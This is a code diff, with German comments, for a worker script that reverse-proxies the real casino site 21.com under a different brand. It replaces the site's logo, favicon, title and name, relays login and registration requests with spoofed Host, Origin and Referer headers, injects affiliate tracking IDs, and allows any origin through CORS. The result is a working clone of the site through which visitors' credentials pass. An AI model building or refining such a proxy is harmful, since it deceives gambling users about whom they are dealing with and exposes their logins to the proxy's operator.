@@ -11,7 +11,7 @@ export default {
     const newLogoUrl = "https://DEINE-DOMAIN.com/DEIN-NEUES-LOGO.png"; 
     const customFaviconUrl = "https://DEINE-DOMAIN.com/DEIN-FAVICON.png"; 
 
-    const customTabTitle = "Mein Casino - Exklusiver Bonus"; 
+    const customTabTitle = "dein Casino - Exklusiver Bonus"; 
 
     const textReplacements = {
       "21.com": "MeinCasino",
@@ -19,6 +19,18 @@ export default {
       "Registrieren": "Konto erstellen"
     };
     // =========================================================================
+
+    // 0. OPTIONS-Anfragen (CORS Preflight) direkt beantworten
+    if (request.method === "OPTIONS") {
+      return new Response(null, {
+        status: 204,
+        headers: {
+          "Access-Control-Allow-Origin": "*",
+          "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, OPTIONS",
+          "Access-Control-Allow-Headers": "*"
+        }
+      });
+    }
 
     // 1. Cookies auslesen
     const cookieHeader = request.headers.get("Cookie") || "";
@@ -31,7 +43,7 @@ export default {
     let affiliateId = cookies["aff_affiliateId"];
     let setCookiesToSave = [];
 
-    // 2. Wenn noch keine Tracking-ID im Cookie ist, einmalig im Hintergrund anfragen
+    // 2. Tracking-ID einmalig abrufen, falls noch nicht vorhanden
     if (!trackerId) {
       try {
         const trackerResponse = await fetch(affiliateTrackerUrl, {
@@ -67,7 +79,7 @@ export default {
       if (affiliateId) targetUrl.searchParams.set("affiliateId", affiliateId);
     }
 
-    // 4. Proxy-Header vorbereiten (WICHTIG: Origin und Referer auf 21.com setzen für AJAX/Login)
+    // 4. Proxy-Header vorbereiten
     const proxyHeaders = new Headers(request.headers);
     proxyHeaders.set("Host", "www.21.com");
     proxyHeaders.set("Origin", "https://www.21.com");
@@ -79,30 +91,25 @@ export default {
       redirect: "follow"
     };
 
-    // Für POST/PUT (Login, Registrierung, AJAX-Calls) den Body sicher klonen
+    // Body direkt für POST/PUT übergeben
     if (request.method !== "GET" && request.method !== "HEAD") {
-      try {
-        fetchOptions.body = request.clone().body;
-      } catch (e) {}
+      fetchOptions.body = request.body;
     }
 
     let response;
     try {
       response = await fetch(targetUrl, fetchOptions);
     } catch (err) {
-      // JSON-freundlicher Fehler falls AJAX fehlschlägt
-      if (request.headers.get("accept")?.includes("application/json")) {
-        return new Response(JSON.stringify({ error: "Proxy connection failed" }), {
-          status: 500,
-          headers: { "Content-Type": "application/json" }
-        });
-      }
-      return new Response("Proxy Error", { status: 500 });
+      // GARantiert valides JSON im Fehlerfall, damit das Login-Skript nicht abstürzt
+      return new Response(JSON.stringify({ error: err.message || "Proxy connection failed" }), {
+        status: 500,
+        headers: { "Content-Type": "application/json" }
+      });
     }
 
     const contentType = response.headers.get("content-type") || "";
 
-    // 5. Wenn HTML zurückkommt, Logo, Titel, Favicon und Texte anpassen
+    // 5. HTML bearbeiten (Logo, Titel, Favicon, Texte)
     if (contentType.includes("text/html")) {
       let newResponse = new HTMLRewriter()
         .on("head", {
